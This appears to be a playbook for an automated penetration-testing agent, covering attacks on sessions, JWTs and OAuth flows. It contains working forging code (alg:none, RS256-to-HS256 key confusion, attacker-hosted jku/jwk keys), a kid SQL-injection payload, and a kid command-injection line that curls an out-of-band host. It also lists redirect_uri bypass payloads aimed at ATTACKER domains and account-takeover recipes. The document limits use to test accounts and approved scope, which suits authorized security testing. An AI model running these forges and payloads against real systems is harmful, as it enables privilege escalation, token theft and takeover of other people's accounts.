# Auth attack techniques (shared by auth-bypass / jwt / oauth)
# Use TEST accounts. No real brute-force / no locking out real users. Reset/MFA flows are approval-gated.

## Session management (feeder + auth-bypass)
- Cookie flags: missing `Secure`/`HttpOnly`/`SameSite` (pair with XSS/CSRF).
- **Fixation:** does the session id change on login? If not, a pre-set id survives auth.
- **Logout:** is the token invalidated server-side on logout? (replay after logout)
- Predictable/short tokens; token in URL; "remember me" token strength.

## auth-bypass
- Default/weak creds; username enumeration (timing / message diff).
- Forced browsing: reach an authed page/endpoint without a session (direct URL/API).
- Response tampering: flip `{"success":false}` / `2faRequired:true` client-side gates.
- **2FA/MFA bypass:** skip the 2FA step (go straight to the post-2FA endpoint), reuse/brute the OTP
  (rate-limit permitting — few attempts only), backup-code abuse.
- Password-reset: token predictability, host-header poisoning (→ host-header agent), reuse, no expiry.
- **Password CHANGE without the current password:** a `change-password` endpoint that doesn't verify the
  CURRENT password lets anyone holding the victim's *session* (or a CSRF) set a new one. Test on a TEST
  account: call the change with `new`/`repeat` only (omit/blank `current`, or send a wrong `current`) —
  if it succeeds, it's broken (CWE-620). Combine with a session you shouldn't have (e.g. a SQLi-obtained
  login for another test user) to show cross-account takeover.
- **Security-question reset abuse:** the "answer" is low-entropy and often OSINT-derivable (pet, school,
  city) or guessable from a small set; a distinct response for right-vs-wrong answers is a guessing oracle.
  Enumerate the question, try a bounded set of likely answers on a TEST account (lockout-aware, few tries),
  and if it resets the password it's a weak second factor. Never brute a real user's answer.

## jwt
- `alg:none` (strip signature); accept `{"alg":"none"}`.
- Weak HMAC secret → crack offline (`hashcat`/`jwt_tool`), re-sign tampered claims.
- **Key confusion** RS256→HS256: sign with the public key as the HMAC secret.
- `kid` injection (path/SQL), `jku`/`x5u` pointing to attacker JWKS.
- Claim tampering: `sub`/`role`/`admin`/`exp` — accepted without verification?
- `jwt_tool -t <url> -rc <cookie>` for playbook; confirm the forged token is ACCEPTED.

## oauth / oidc
- `redirect_uri` manipulation (open-redirect in the allowlist → steal `code`/token); `redirect_uri`
  suffix/subdomain/path bypass.
- Missing/replayable `state` → login CSRF / account linking.
- Authorization-code reuse / no PKCE (downgrade) / implicit-flow token in URL fragment leak.
- `id_token` signature / audience (`aud`) / issuer (`iss`) not validated.
- Account takeover via email-unverified OAuth linking.

---
## JWT — offline cracking + key-confusion forging

### Crack a weak HMAC secret (offline)
```
hashcat -m 16500 jwt.txt wordlist.txt            # 16500 = JWT (HS256/384/512)
#   good lists: rockyou.txt, and jwt.secrets.list (a JWT-specific key dictionary)
jwt_tool <token> -C -d jwt.secrets.list          # jwt_tool crack mode
```
Once cracked, re-sign tampered claims with the recovered secret and confirm the server ACCEPTS it.

### RS256 → HS256 key confusion (forge with the PUBLIC key)
If the server verifies with a published/recoverable RSA public key but can be coerced to HS256, sign
the token using that public key *as the HMAC secret*:
```python
import jwt   # PyJWT
pub = open('public.pem').read()
forged = jwt.encode({"user":"admin","role":"admin"}, pub, algorithm="HS256")
```
Recover the public key when not published: `jwt_tool -X k` or derive from two RS256 tokens (`rsa_sign2n`).

### Source-review sinks (grep the app when you have code)
```
verify_signature": False        verify=False            options={"verify_signature": False}
algorithms=[header["alg"]]       # trusts attacker-chosen alg  -> alg:none / confusion
jwt.decode(token, ... )          # missing algorithms= / verify kwargs
```
Confirm end-to-end: the forged/tampered token must grant access it should not (not just "server didn't error").

---
## Extended arsenal — JWT header-injection key sourcing (jku / x5u / jwk / x5c)

The verifier is only as trustworthy as *where it gets the key*. If any header steers key selection and
isn't pinned to an allowlisted key/host, you supply your own key and sign a forged TEST token.

| Header | Points to / carries | Forge by | jwt_tool |
|---|---|---|---|
| `jku` | URL of a JWKS (JSON key set) | host JWKS w/ your pubkey; sign w/ your privkey | `-X s -ju <url>` |
| `x5u` | URL of an X.509 cert (PEM/DER) | host your self-signed cert; sign w/ your privkey | `-X s` |
| `jwk` | an **embedded** public JWK | embed your pubkey; sign w/ your privkey | `-X i` |
| `x5c` | an **embedded** cert chain (b64 DER) | embed your self-signed cert; sign w/ its key | `-X i` |

### jku — attacker-hosted JWKS
```python
# forge: jku header -> YOUR JWKS; body = TEST account escalated   (PyJWT)
import jwt, json
priv = open('attacker_priv.pem').read()
hdr  = {"alg":"RS256","kid":"atk-1","jku":"https://ATTACKER/jwks.json"}
tok  = jwt.encode({"sub":"tester","role":"admin"}, priv, algorithm="RS256", headers=hdr)
# publish jwks.json at https://ATTACKER/jwks.json advertising the matching pubkey (kid atk-1)
# jwt_tool <token> -X s -ju https://ATTACKER/.well-known/jwks.json   # builds + points at the JWKS
```
When the `jku` host is validated against the issuer's domain, reuse the redirect_uri bypass matrix below
on the `jku` value: `https://TARGET@ATTACKER/`, `https://ATTACKER/TARGET`, `https://TARGET.ATTACKER/`,
or chain an open redirect on TARGET so the fetch lands on your JWKS.

### jwk — embedded self-signed public key
```python
from jwcrypto import jwk as J          # generate a throwaway keypair
k   = J.JWK.generate(kty='RSA', size=2048)
hdr = {"alg":"RS256","jwk": json.loads(k.export_public())}
tok = jwt.encode({"sub":"tester","role":"admin"},
                 k.export_to_pem(private_key=True, password=None),
                 algorithm="RS256", headers=hdr)
# jwt_tool <token> -X i    # inject self-signed embedded jwk / x5c
```

### x5u / x5c — cert-based variants
Same idea with a cert: `x5u` fetches a PEM you host; `x5c` embeds a base64-DER self-signed cert. If the
server trusts the embedded/fetched cert instead of a pinned CA or key, it verifies against *your* key.

Each vector: forge a TEST-account token, then confirm the server ACCEPTS it on a privileged endpoint.

---
## Extended arsenal — JWT `kid` abuse (path-traversal / SQLi / command / predictable-file)

`kid` names which key to load. If the lookup is attacker-influenced, point it at key material whose bytes
you know, then HMAC-sign with those exact bytes.

### Predictable-file / path traversal (sign with a known file's contents)
| `kid` value | Key material used | HMAC-sign with |
|---|---|---|
| `../../../../../../dev/null` | empty file → zero-length key | `""` (empty secret) |
| `/proc/sys/kernel/randomize_va_space` | predictable 1-byte file (`2\n`) | that known content |
| `../../../etc/hostname` / any world-readable static file | its (often fetchable) bytes | those bytes |
| a static asset under webroot (css/js/png) | the downloadable asset bytes | the downloaded bytes |

```bash
# /dev/null -> empty key; sign HS256 with "" and a traversal kid
jwt_tool <token> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""
#   -I inject | -hc/-hv set a header claim | -S sign alg | -p HMAC password (empty)
```
```python
# manual empty-key forge
jwt.encode({"sub":"tester","role":"admin"}, "", algorithm="HS256",
           headers={"kid":"../../../../dev/null"})
```

### `kid` SQL injection
If `kid` feeds a query (`SELECT key FROM keys WHERE kid='<kid>'`), UNION-return a key you choose, then
sign with it:
```
kid:  nonexistent' UNION SELECT 'AttackerKnownSecret'-- -
# then HMAC-sign the token with  AttackerKnownSecret
```

### `kid` command injection / LFI
If `kid` reaches a shell or an include, inject a benign OOB marker (prove execution, defer impact):
```
kid:  x| curl http://TOKEN.oob.example/kid-ci        # benign OOB callback only
```
Hand real command-exec/LFI impact to the command-injection / path-traversal skills. Confirm the forged
TEST token is ACCEPTED for privileged access; the OOB hit alone only proves the sink.

---
## Extended arsenal — JWT algorithm-confusion variants (`alg:none` forms, RS/ES/PS → HS)

### `alg:none` case/format variants
Naive blocklists miss case folding. Strip the signature (empty third segment) and try each:
```
{"alg":"none"}   {"alg":"None"}   {"alg":"NONE"}   {"alg":"nOnE"}   {"alg":" none"}
jwt_tool <token> -X a      # tamper -> all alg:none variants, empty signature
```

### Asymmetric → symmetric (public key as the HMAC secret)
Generalizes RS256→HS256: whenever the verifier picks the alg from the token *and* the public key is
knowable, re-sign as HMAC using the **public-key bytes** as the secret.

| Original alg | Public key needed | Forge as |
|---|---|---|
| RS256/384/512 | RSA public key (PEM) | HS256, PEM as secret |
| PS256/384/512 | RSA public key (PEM) | HS256, PEM as secret |
| ES256/384 | EC public key (PEM) | HS256, the EC pubkey PEM as secret |

```bash
jwt_tool <token> -X k -pk public.pem      # key-confusion: public.pem as the HMAC key
```
**First look for the public key exposed** — it is often served at a predictable path (`/encryptionkeys/jwt.pub`,
`/.well-known/jwks.json`, `/jwks`, a `kid`-named file, a source map, or the app's public repo). Fetch it and
use its EXACT bytes as the HMAC secret (see the PEM-format trap below). Only when it is unpublished do you
need to recover it.

Recover the public key when unpublished — derive the RSA modulus from two tokens signed by the same key:
```bash
rsa_sign2n <token1> <token2>              # emits candidate modulus n -> candidate PEMs
jwt_tool <token> -X k                      # try each recovered PEM, then confirm acceptance
```
**PEM-format trap:** verifiers differ on trailing newline, PKCS#1 vs PKCS#8, header lines present/absent.
Try each byte-exact variant of the key as the HMAC secret — the server's loader bytes must match yours.
For ES256 the public key is a curve point; feed its exact serialized PEM bytes as the secret.

---
## Extended arsenal — JWT signature & structure quirks (empty sig / `crit` / nested / parsing)

### Empty / blank / swapped signature
| Form | Token tail | Tests for |
|---|---|---|
| no signature | `header.body.` (trailing dot) | `alg:none`/unverified acceptance |
| truncated sig | `header.body.AA` | length/validation skip |
| foreign sig | swap in a sig made by a *different* known key | wrong-key / verify-skipped |

### `crit` (critical header) abuse
`crit` lists header params the verifier MUST understand. Some libraries crash-open (accept when they
should reject) or let an unprocessed param through. Probe `{"crit":["kid"], ...}` or a bogus
`{"crit":["exp"]}` and watch whether validation is skipped.

### Nested JWT (token-in-token)
A JWS wrapped in a JWE, or a claim whose value is itself a JWT. Confusion arises when one layer is
verified and the other (the one the authz decision reads) is not. Tamper the *inner* claims and see which
layer wins.

### Location / parsing quirks
| Quirk | Test |
|---|---|
| duplicate claims | two `"role"` keys — first vs last wins? set the non-verified one to `admin` |
| JSON type confusion | `"aud":"x"` vs `["x"]`; `"exp":"9999999999"` (string) vs int |
| stray bytes | leading `\n`/BOM/whitespace; `Bearer  <token>` (double space) |
| alg case/whitespace | `"alg":" HS256"`, `"alg":"hs256"` |
| base64 variant | url-safe vs std; padded vs unpadded |
| two tokens present | cookie token vs `Authorization` token — which is trusted? downgrade to the weaker |

Each: put the privileged claim in whichever copy the server actually trusts, then confirm acceptance for
a TEST account.

---
## Extended arsenal — JWT claim-tampering matrix (sub/role/scope/aud/exp/nbf/…)

Change **one** claim at a time on a TEST-account token, re-sign with whatever primitive you hold
(cracked secret / key-confusion / none / jku), and confirm the server GRANTS elevated access. A tamper
the server ignores (same access) is **not** a finding.

| Claim | Meaning | Tamper (TEST acct) | Confirms |
|---|---|---|---|
| `sub` | subject / user id | swap to another TEST user's / an admin TEST id | identity authz (horiz/vert) |
| `role`/`roles`/`groups` | authz role | `user`→`admin`; add `["admin"]` | privilege escalation |
| `scope`/`scp` | granted scopes | add `admin` / `write` / `*` | scope escalation |
| `aud` | intended audience | point at a sibling service sharing the key | cross-service reuse |
| `iss` | issuer | swap to a trusted issuer you can sign for (+jku/jwk) | issuer not pinned |
| `exp` | expiry | push far future | expired-token / no-exp acceptance |
| `nbf` | not-before | set future, then present | nbf not enforced |
| `iat` | issued-at | back/forward-date | freshness window flaws |
| `jti` | token id | reuse / omit | replay / one-time enforcement |
| `azp`/`client_id` | authorized party | swap client | confused-deputy across clients |
| custom (`tenant`,`org`,`is_admin`) | app flags | flip boolean / change tenant | multi-tenant / feature bypass |

---
## Extended arsenal — JWE (encrypted JWT) basics

A JWE has **five** dot-separated segments (not three):
`header.encrypted_key.iv.ciphertext.tag`. Header `alg` is a key-management alg (`RSA-OAEP`, `A256KW`,
`dir`); `enc` is the content cipher (`A256GCM`, `A128CBC-HS256`).

| Probe | Tests |
|---|---|
| `alg:"dir"` + empty/guessable key | direct-key with a weak CEK |
| unprotected/`none`-style content | library accepts unencrypted content |
| `enc` CBC↔GCM swap / CBC bit-flip | malleability / padding oracle |
| `RSA-OAEP`→`RSA1_5` downgrade | downgrade to a padding-oracle-prone mode |

JWE crypto primitives (padding oracle, IV reuse, bit-flipping) belong to the **crypto-attacks** skill.
Here, confirm only whether a tampered/forged JWE is ACCEPTED as a valid session for a TEST account.

---
## Extended arsenal — JWT benign end-to-end confirmation recipe

The proof that counts is a three-point check: baseline denies, forge grants, garbage-sig denies.
```bash
# 0. Baseline: with NO token (or junk), the privileged endpoint must DENY.
curl -s -o /dev/null -w '%{http_code}\n' https://TARGET/api/admin                      # expect 401/403

# 1. Capture a legit TEST-account (low-priv) token; decode it.
jwt_tool <token>                                   # note alg, kid, claims

# 2. Forge: apply ONE technique (none / weak-secret / key-confusion / jku / kid),
#    escalating the SAME test account (role=admin, scope=admin, ...). Never a real user's sub.

# 3. POSITIVE proof: the forged token is ACCEPTED where it must not be.
curl -s -H "Authorization: Bearer <forged>"      https://TARGET/api/admin              # expect 200 + admin data

# 4. NEGATIVE control: the same claims with a RANDOM signature must be REJECTED —
#    proving step 3 passed because of the forge, not because auth is simply off.
curl -s -H "Authorization: Bearer <forged.garbagesig>" https://TARGET/api/admin        # expect 401/403
```
Finding = (0) denies AND (3) grants AND (4) denies. Record the decoded forged claims + all responses.

---
## Extended arsenal — OAuth redirect_uri bypass matrix

Goal: make the authorization server deliver YOUR TEST account's `code`/token to a URI you control, then
confirm it lands on your `TOKEN.oob.example`. Never harvest another user's code.
Allowlisted value in examples = `https://TARGET/cb`.

| Class | Candidate | Why it slips |
|---|---|---|
| suffix | `https://TARGET/cb.ATTACKER` ; `https://TARGET/cbATTACKER` | prefix/startswith match |
| prefix | `https://ATTACKER/?x=https://TARGET/cb` | endswith/contains match |
| subdomain | `https://ATTACKER.TARGET` ; `https://TARGET.ATTACKER` | wildcard / sloppy host check |
| path append | `https://TARGET/cb/../../ATTACKER` ; `https://TARGET/cb/%2e%2e/evil` | normalization diff |
| parameter / HPP | `https://TARGET/cb?x=.ATTACKER` ; send `redirect_uri` twice | param-parsing diff |
| `@` userinfo | `https://TARGET/cb@ATTACKER/` ; `https://ATTACKER\@TARGET` | authority parsing |
| backslash / encoded | `https://TARGET/cb\.ATTACKER` ; `https://TARGET/cb%2f%2e%2e%2fATTACKER` ; double-encode | decode-then-match order |
| loopback (native apps) | register `http://localhost/cb` then `127.0.0.1.ATTACKER` / DNS rebind | loopback allowed |
| missing / wildcard | omit `redirect_uri` (default) or `*` registered | no exact match enforced |
| scheme downgrade | `http://TARGET/cb` vs `https` | scheme not pinned |
| open redirect in allowlist | `https://TARGET/out?to=https://ATTACKER` | host trusted, full path not |

```
# Start the flow as a TEST account; redirect_uri resolves to YOUR collector via the @ trick.
GET https://TARGET/oauth/authorize?client_id=...&response_type=code
    &redirect_uri=https://TARGET/cb@TOKEN.oob.example&state=...
# Success = the TEST account's code/token arrives at TOKEN.oob.example (your host). Then redeem it
# at /token and confirm it yields a working session for that TEST account.
```

---
## Extended arsenal — OAuth response_type / response_mode tricks

| Tweak | Effect | Use |
|---|---|---|
| `response_type=token` (implicit) where `code` expected | token in URL **fragment** | leak via Referer/history → TOKEN.oob.example |
| `response_type=code token` / `code id_token` (hybrid) | multiple artifacts, fragment delivery | broaden leak surface |
| `response_type=id_token` + weak `nonce` | id_token in fragment | replay / nonce flaws |
| force `response_mode=query` on implicit | token in query (logged, Referer-leaked) | easier capture |
| `form_post` → `query`/`fragment` downgrade | move artifact to a leakier channel | leakage |
| `response_mode=web_message` + loose target origin | token posted cross-origin | capture at your origin |

Benign confirm: run as a TEST account; show that YOUR account's artifact is delivered to the leakier
channel and reaches `TOKEN.oob.example`.

---
## Extended arsenal — OAuth state / nonce / PKCE flaws

| Flaw | Test | Impact |
|---|---|---|
| missing `state` | drop it — flow still completes? | login CSRF / forced account linking |
| non-random / reused `state` | same value accepted twice / predictable | CSRF protection void |
| `state` not session-bound | finish account B's flow with A's `state` | CSRF |
| `nonce` missing/unchecked (OIDC) | replay an old `id_token` | id_token replay |
| PKCE downgrade | drop `code_challenge` on `/authorize`, redeem w/o `code_verifier` | stolen code becomes usable |
| `code_challenge_method=plain` | send `plain` when `S256` expected | weaker binding / guessable |
| PKCE challenge swap / injection | mix victim's code with attacker's challenge | code injection |

```
# PKCE-downgrade proof (TEST account only):
# 1. Authorize WITHOUT code_challenge.
GET /authorize?client_id=...&response_type=code&redirect_uri=...&state=...
# 2. Redeem the code WITHOUT code_verifier.
POST /token  grant_type=authorization_code&code=<test-code>&redirect_uri=...
# Tokens returned => PKCE not enforced. Use only your TEST account's code.
```

---
## Extended arsenal — OAuth code / token leakage channels

| Channel | Mechanism | Benign confirm |
|---|---|---|
| `Referer` | artifact in URL query leaks via `Referer` on an outbound img/link to ATTACKER | TEST artifact shows in TOKEN.oob.example logs |
| history / logs | artifact in query string persists | observable for YOUR test session |
| URL fragment | implicit/hybrid token in `#`, read by injected JS | your JS posts YOUR token to TOKEN.oob.example |
| open redirect / 302 chain | code survives redirect to your host | your code reaches your host |
| `window.name` / postMessage | loose target origin leaks artifact | your origin receives it |
| cache / proxy | artifact in a cacheable response | re-read for your session only |

Rule: only ever route **your TEST account's** code/token to **your** `TOKEN.oob.example`. Never capture
or exfiltrate another user's code.

---
## Extended arsenal — OAuth mix-up, IdP confusion & cross-client substitution

| Attack | Setup | Benign proof |
|---|---|---|
| IdP mix-up | multi-IdP client; start at honest IdP, swap `iss`/endpoint so the code goes to the wrong token endpoint | your TEST code redeemed at the attacker-chosen endpoint |
| code substitution | inject your own valid code into the victim's linking session (needs missing `state`) | TEST-account linking resolves to your identity |
| cross-client reuse | redeem a code/token issued for client A at client B (shared backend / key) | TEST token accepted by the other client |
| audience confusion | `id_token` with `aud=A` accepted by a resource expecting `aud=B` | TEST id_token grants B |
| `azp` ignored | swap `azp`/`client_id` | cross-client acceptance |

All with a TEST identity; confirm access is **granted**, not merely "no error".

---
## Extended arsenal — OAuth scope escalation, dynamic client registration & SSRF

| Vector | Technique | Benign confirm |
|---|---|---|
| scope escalation | request extra scopes (`admin`, `offline_access`, `*`), or add scopes at `/token` not consented | token shows elevated scope AND unlocks a scoped TEST action |
| scope upgrade on refresh | refresh with a broader `scope=` than granted | broader token returned |
| dynamic client registration (DCR) | `POST /register` with attacker `redirect_uris`/`jwks_uri`/`logo_uri`/`sector_identifier_uri` | your client registered with your redirect/jwks |
| DCR `jwks_uri` → key control | register a client whose `jwks_uri` you host → sign `private_key_jwt` client auth yourself | client-auth as your registered client |
| SSRF via `request_uri` (request object) | `/authorize?request_uri=http://TOKEN.oob.example/ro` | server fetches YOUR host (OOB hit) |
| SSRF via `jwks_uri`/`sector_identifier_uri`/`logo_uri` | point a server-fetched URL at an internal/OOB host | OOB callback from TARGET egress |

SSRF confirm = an attributable callback to `TOKEN.oob.example` from TARGET's egress; defer deeper
internal exploitation to the **ssrf** skill. SSRF-to-metadata and DCR are approval-gated — keep to the
agreed scope and **unregister/clean up** any test client you created.

---
## Extended arsenal — OAuth account takeover via unverified-email linking

If the app links an OAuth/social identity to a local account **by email without proving the IdP verified
that email**, you can bind identities across accounts.

| Variant | Test (TEST accounts you own) |
|---|---|
| unverified-email trust | IdP returns `email_verified:false` (or omits it) but the app links by `email` → does it merge? |
| pre-registration claim | create a local TEST-victim account; victim then logs in via IdP → does it attach to YOUR account? |
| email-change race | change the IdP email to the TEST-victim's after consent → re-link |
| no re-auth on link | add an OAuth login to a session you shouldn't control (CSRF the link via missing `state`) |

Benign confirm: use **two TEST accounts you own** (attacker-TEST + victim-TEST). Show that after the
linking flow, attacker-TEST's OAuth login grants access to victim-TEST's account — proven by reading a
victim-TEST-only resource — then **unlink**. Never target a real user's account or email; this flow is
approval-gated and scope-bound.
